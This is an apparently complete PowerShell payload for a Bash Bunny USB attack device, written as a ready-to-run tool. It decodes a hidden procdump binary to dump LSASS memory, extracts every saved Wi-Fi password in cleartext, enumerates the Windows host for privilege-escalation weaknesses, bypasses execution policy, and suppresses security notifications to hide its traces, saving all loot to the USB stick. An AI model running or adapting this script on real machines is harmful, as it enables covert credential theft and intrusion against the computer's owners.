##                                                                ##
##  Ducked script by scaery v.1.0                                 ##
##  ________                 __              .___                 ##
##  \______ \  __ __   ____ |  | __ ____   __| _/                 ##
##   |    |  \|  |  \_/ ___\|  |/ // __ \ / __ |                  ##
##   |    `   \  |  /\  \___|    <\  ___// /_/ |                  ##
##  /_______  /____/  \___  >__|_ \\___  >____ |                  ##
##          \/            \/     \/    \/     \/                  ##
##                                                                ##
##   Windows Enumeration - LSASS Dump - Wifi Credential Dumper    ##
##                                                                ##
####################################################################

$switch = "switch1"
$usb = (gwmi win32_volume -f 'label="BASHBUNNY"').Name
$usb_loot = "loot\"
$date = Get-Date -UFormat "%Y-%m-%d-%H-%M"
$loot = $usb + $usb_loot + $env:computername + "_" + $date
$usb_create = New-Item -ItemType directory $loot
$proc = "$usb\payloads\$switch\procdump.txt"
$proc_decode = certutil -decode $proc exec.exe
$procdump = "$usb\payloads\$switch\exec.exe"
$proc_run  = cmd.exe /c exec.exe -ma lsass.exe -accepteula "$loot\$date-lsass.$env:computername.dmp"
$wifi = (netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Out-File $loot\$date-wifidump.log

$lines="------------------------------------------"
function whost($a) {
    Write-Host
    Write-Host -ForegroundColor Green $lines
    Write-Host -ForegroundColor Green " "$a 
    Write-Host -ForegroundColor Green $lines
}

whost "Windows Enumeration Script v 0.1
        original by absolomb 
        modified by scaery
            !!!!!!!!!"

$commands = [ordered]@{
    'Basic System Information'                    = 'Start-Process "systeminfo" -NoNewWindow -Wait';
    'Environment Variables'                       = 'Get-ChildItem Env: | ft Key,Value';
    'Network Information'                         = 'Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address';
    'DNS Servers'                                 = 'Get-DnsClientServerAddress -AddressFamily IPv4 | ft';
    'ARP cache'                                   = 'Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State';
    'Routing Table'                               = 'Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex';
    'Network Connections'                         = 'Start-Process "netstat" -ArgumentList "-ano" -NoNewWindow -Wait | ft';
    'Connected Drives'                            = 'Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft';
    'Firewall Config'                             = 'Start-Process "netsh" -ArgumentList "firewall show config" -NoNewWindow -Wait | ft';
    'Current User'                                = 'Write-Host $env:UserDomain\$env:UserName';
    'User Privileges'                             = 'start-process "whoami" -ArgumentList "/priv" -NoNewWindow -Wait | ft';
    'Local Users'                                 = 'Get-LocalUser | ft Name,Enabled,LastLogon';
    'Logged in Users'                             = 'Start-Process "qwinsta" -NoNewWindow -Wait | ft';
    'Credential Manager'                          = 'start-process "cmdkey" -ArgumentList "/list" -NoNewWindow -Wait | ft'
    'User Autologon Registry Items'               = 'Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" | select "Default*" | ft';
    'Local Groups'                                = 'Get-LocalGroup | ft Name';
    'Local Administrators EN'                     = 'Get-LocalGroupMember Administrators | ft Name, PrincipalSource';
    'Local Administrators DE'                     = 'Get-LocalGroupMember Administratoren | ft Name, PrincipalSource';
    'User Directories'                            = 'Get-ChildItem C:\Users | ft Name';
    'Searching for SAM backup files'              = 'Test-Path %SYSTEMROOT%\repair\SAM ; Test-Path %SYSTEMROOT%\system32\config\regback\SAM';
    'Running Processes'                           = 'gwmi -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize';
    'Installed Software Directories'              = 'Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" | ft Parent,Name,LastWriteTime';
    'Software in Registry'                        = 'Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name';
    'Folders with Everyone Permissions'           = 'Get-ChildItem "C:\Program Files\*", "C:\Program Files (x86)\*" | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match "Everyone"} } catch {}} | ft';
    'Folders with BUILTIN\User Permissions'       = 'Get-ChildItem "C:\Program Files\*", "C:\Program Files (x86)\*" | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match "BUILTIN\Users"} } catch {}} | ft';
    'Checking registry for AlwaysInstallElevated' = 'Test-Path -Path "Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer" | ft';
    'Unquoted Service Paths'                      = 'gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike ''"*''} | select PathName, DisplayName, Name | ft';
    'Scheduled Tasks'                             = 'Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State';
    'Tasks Folder'                                = 'Get-ChildItem C:\Windows\Tasks | ft';
    'Startup Commands'                            = 'Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl';
}

function RunCommands($commands) {
    ForEach ($command in $commands.GetEnumerator()) {
        whost $command.Name
        Invoke-Expression $command.Value
    }
}

# Disable Notifications 

New-Item HKCU:\Software\Policies\Microsoft\Windows\Explorer -Force
$registryPath1 = "HKCU:\Software\Policies\Microsoft\Windows\Explorer"
$Name1 = "DisableNotificationCenter"
$value1 = "00000001"
IF(!(Test-Path $registryPath1))  {
    New-Item -Path $registryPath1 -Force | Out-Null
    New-ItemProperty -Path $registryPath1 -Name $Name1 -Value $value1 `
    -PropertyType DWORD -Force | Out-Null
    } ELSE {
    New-ItemProperty -Path $registryPath1 -Name $Name1 -Value $value1 `
    -PropertyType DWORD -Force | Out-Null
    }

New-Item HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance -Force
$registryPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance"
$Name2 = "Enabled"
$value2 = "00000000"
IF(!(Test-Path $registryPath2))  {
    New-Item -Path $registryPath2 -Force | Out-Null
    New-ItemProperty -Path $registryPath2 -Name $Name2 -Value $value2 `
    -PropertyType DWORD -Force | Out-Null
    } ELSE {
    New-ItemProperty -Path $registryPath2 -Name $Name2 -Value $value2 `
    -PropertyType DWORD -Force | Out-Null
    }

New-Item HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel -Force
$registryPath3 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel"
$Name3 = "Enabled"
$value3 = "00000000"
IF(!(Test-Path $registryPath3))  {
    New-Item -Path $registryPath3 -Force | Out-Null
    New-ItemProperty -Path $registryPath3 -Name $Name3 -Value $value3 `
    -PropertyType DWORD -Force | Out-Null
    } ELSE {
    New-ItemProperty -Path $registryPath3 -Name $Name3 -Value $value3 `
    -PropertyType DWORD -Force | Out-Null
    }

New-Item HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.AutoPlay -Force
$registryPath4 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.AutoPlay"
$Name4 = "Enabled"
$value4 = "00000000"
IF(!(Test-Path $registryPath4))  {
    New-Item -Path $registryPath4 -Force | Out-Null
    New-ItemProperty -Path $registryPath4 -Name $Name4 -Value $value4 `
    -PropertyType DWORD -Force | Out-Null
    } ELSE {
    New-ItemProperty -Path $registryPath4 -Name $Name4 -Value $value4 `
    -PropertyType DWORD -Force | Out-Null
    }

$notify_disable={
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "ToastEnabled" -Type DWord -Value 0
}
$notify_enable={
Remove-Item $registryPath1 -Force  | Out-Null
Remove-Item $registryPath2 -Force  | Out-Null
Remove-Item $registryPath3 -Force  | Out-Null
Remove-Item $registryPath4 -Force  | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "ToastEnabled" -Type DWord -Value 1
}

##################### EXECUTION STEPS ######################################

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

Invoke-Command -Scriptblock $notify_disable

RunCommands($commands) > $loot\$date-winenum.log

whost "Procdump LSASS! AV-free! Caution: Not Defender aware!"
$proc_run

whost "Dumping Wifi Credentials to USB"
$wifi

whost "Hiding traces and notifications"
Invoke-Command -Scriptblock $notify_enable
